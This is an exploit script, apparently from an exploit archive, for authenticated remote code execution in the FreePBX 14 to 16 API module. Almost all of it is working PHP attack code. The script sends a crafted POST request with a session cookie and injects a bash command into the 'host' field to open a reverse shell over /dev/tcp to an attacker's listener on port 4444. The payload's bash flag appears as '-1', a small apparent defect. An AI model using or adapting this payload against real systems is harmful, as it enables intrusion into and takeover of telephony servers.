# Exploit Title: FreePBX 16 -  Remote Code Execution (RCE) (Authenticated)
# Exploit Author: Cold z3ro
# Date: 6/1/2024
# Tested on: 14,15,16
# Vendor: https://www.freepbx.org/

<?php
///
/// FREEPBX [14,15,16] API Module Authenticated RCE 
/// Orginal Difcon || https://www.youtube.com/watch?v=rqFJ0BxwlLI
/// Cod[3]d by Cold z3ro 
///
$url = "10.10.10.186"; // remote host
$backconnectip = "192.168.0.2";
$port = "4444"; 
$PHPSESSID = "any valid session even extension";

	echo "checking $url\n";
	$url = trim($url);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://'.$url.'/admin/ajax.php?module=api&command=generatedocs');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
	curl_setopt($ch, CURLOPT_TIMEOUT, 2);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Referer: http://'.$url.'/admin/config.php?display=api',
		'Content-Type: application/x-www-form-urlencoded',
	]);
	curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID='.$PHPSESSID);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'scopes=rest&host=http://'.$backconnectip.'/$(bash -1 >%26 /dev/tcp/'.$backconnectip.'/4444 0>%261)');
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

	echo $response = curl_exec($ch)."\n";

	curl_close($ch);

?>